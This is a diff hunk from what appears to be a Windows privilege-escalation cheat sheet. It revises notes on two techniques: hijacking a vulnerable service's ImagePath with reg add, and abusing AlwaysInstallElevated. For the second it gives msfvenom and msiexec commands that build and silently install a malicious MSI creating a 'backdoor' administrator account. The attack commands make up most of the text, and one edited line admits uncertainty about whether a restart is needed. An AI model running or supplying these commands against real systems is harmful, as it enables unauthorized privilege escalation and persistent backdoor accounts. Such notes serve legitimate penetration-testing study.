@@ -118,19 +118,19 @@ sc start <vuln-service>
 accesschk.exe -quvcw *		      	-->  DACLs of every service
 accesschk.exe -quvcw Service1 	-->	 DACLs of one service
 
-Change the Imagepath to our binary. It needs to restart the computer
+Change the Imagepath to our binary. It needs to restart the computer? or restarting the service is enough? Not sure!
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
 
 
 # AlwaysInstallElevated
-AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions. 
-Check if these 2 registry values are set to “1”: 
+AlwaysInstallElevated is a group policy setting that allows regular users the ability to install a MSI package with SYSTEM privileges.
+
+If these 2 registry values are set to “1”, the system is vulnerable:
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
-If they are, create your own malicious msi: 
+Exploitation:
 msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
-Then use msiexec on victim to execute your msi: 
 msiexec /quiet /qn /i C:\evil.msi
 
 
